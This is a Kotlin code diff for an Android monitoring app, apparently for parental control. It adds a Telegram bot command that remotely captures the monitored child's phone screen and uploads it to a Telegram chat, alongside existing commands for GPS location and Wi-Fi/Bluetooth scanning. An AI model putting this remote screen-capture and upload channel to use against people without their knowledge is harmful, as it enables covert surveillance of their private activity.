@@ -5,6 +5,7 @@ import android.content.SharedPreferences
 import android.util.Log
 import com.example.data.location.LocationHelper
 import com.example.data.scanner.NetworkScanner
+import com.example.utils.ScreenshotHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -301,9 +302,31 @@ class TelegramBotManager(private val context: Context) {
                     }
                 }
             }
+            "/screenshot", "/ss", "/layar", "/tangkap_layar" -> {
+                executeSendMessage(
+                    token,
+                    chatId,
+                    "📸 <b>[Screenshot] Mengambil tangkapan layar HP anak...</b>\n<i>Mohon tunggu sebentar.</i>"
+                )
+
+                ScreenshotHelper.captureScreenshot(context) { photoBytes ->
+                    if (photoBytes != null && photoBytes.isNotEmpty()) {
+                        CoroutineScope(Dispatchers.IO).launch {
+                            val caption = "📸 <b>[Famly] Tangkapan Layar Perangkat</b>\n\n🕒 <i>Waktu: $timeStr</i>"
+                            val sent = sendPhoto(photoBytes, caption, chatId)
+                            if (!sent) {
+                                executeSendMessage(token, chatId, "⚠️ <b>Gagal mengirim foto screenshot ke Telegram.</b>")
+                            }
+                        }
+                    } else {
+                        executeSendMessage(token, chatId, "⚠️ <b>Gagal mengambil screenshot layar HP anak.</b>")
+                    }
+                }
+            }
             "/start", "/help" -> {
                 val replyMsg = "👋 <b>Selamat Datang di Bot Famly!</b>\n\n" +
                         "Perintah yang dapat Anda gunakan:\n" +
+                        "• <code>/screenshot</code> - Tangkap gambar layar HP anak secara langsung\n" +
                         "• <code>/lokasi</code> - Meminta koordinat GPS & peta lokasi terkini anak\n" +
                         "• <code>/scan</code> - Meminta pemindaian jaringan Wi-Fi & Bluetooth di sekitar\n" +
                         "• <code>/ping</code> - Cek status koneksi bot & GPS HP anak\n" +
@@ -481,6 +504,75 @@ class TelegramBotManager(private val context: Context) {
             }
         } catch (e: Exception) {
             Log.e("TelegramBotManager", "Gagal mengirim ke Telegram: ${e.message}", e)
+            false
+        }
+    }
+
+    suspend fun sendPhoto(
+        photoBytes: ByteArray,
+        captionHtml: String = "",
+        targetChatId: String? = null
+    ): Boolean = withContext(Dispatchers.IO) {
+        val token = getBotToken()
+        val chatId = if (!targetChatId.isNullOrBlank()) targetChatId else getChatId()
+        if (token.isBlank() || chatId.isBlank()) return@withContext false
+
+        val boundary = "*****" + System.currentTimeMillis() + "*****"
+        val lineEnd = "\r\n"
+        val twoHyphens = "--"
+
+        return@withContext try {
+            val url = URL("https://api.telegram.org/bot$token/sendPhoto")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.connectTimeout = 15000
+            conn.readTimeout = 25000
+            conn.doOutput = true
+            conn.doInput = true
+            conn.useCaches = false
+            conn.setRequestProperty("Connection", "Keep-Alive")
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+
+            conn.outputStream.use { os ->
+                // chat_id parameter
+                os.write(("$twoHyphens$boundary$lineEnd").toByteArray())
+                os.write(("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd").toByteArray())
+                os.write(("$chatId$lineEnd").toByteArray())
+
+                // caption parameter
+                if (captionHtml.isNotBlank()) {
+                    os.write(("$twoHyphens$boundary$lineEnd").toByteArray())
+                    os.write(("Content-Disposition: form-data; name=\"caption\"$lineEnd$lineEnd").toByteArray())
+                    os.write(("$captionHtml$lineEnd").toByteArray())
+
+                    os.write(("$twoHyphens$boundary$lineEnd").toByteArray())
+                    os.write(("Content-Disposition: form-data; name=\"parse_mode\"$lineEnd$lineEnd").toByteArray())
+                    os.write(("HTML$lineEnd").toByteArray())
+                }
+
+                // photo binary file
+                os.write(("$twoHyphens$boundary$lineEnd").toByteArray())
+                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"$lineEnd").toByteArray())
+                os.write(("Content-Type: image/jpeg$lineEnd$lineEnd").toByteArray())
+                os.write(photoBytes)
+                os.write(lineEnd.toByteArray())
+
+                // end boundary
+                os.write(("$twoHyphens$boundary$twoHyphens$lineEnd").toByteArray())
+                os.flush()
+            }
+
+            val responseCode = conn.responseCode
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                Log.d("TelegramBotManager", "Foto/Screenshot berhasil dikirim ke Telegram!")
+                true
+            } else {
+                val errorMsg = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                Log.e("TelegramBotManager", "Gagal sendPhoto ($responseCode): $errorMsg")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramBotManager", "Error sendPhoto: ${e.message}", e)
             false
         }
     }
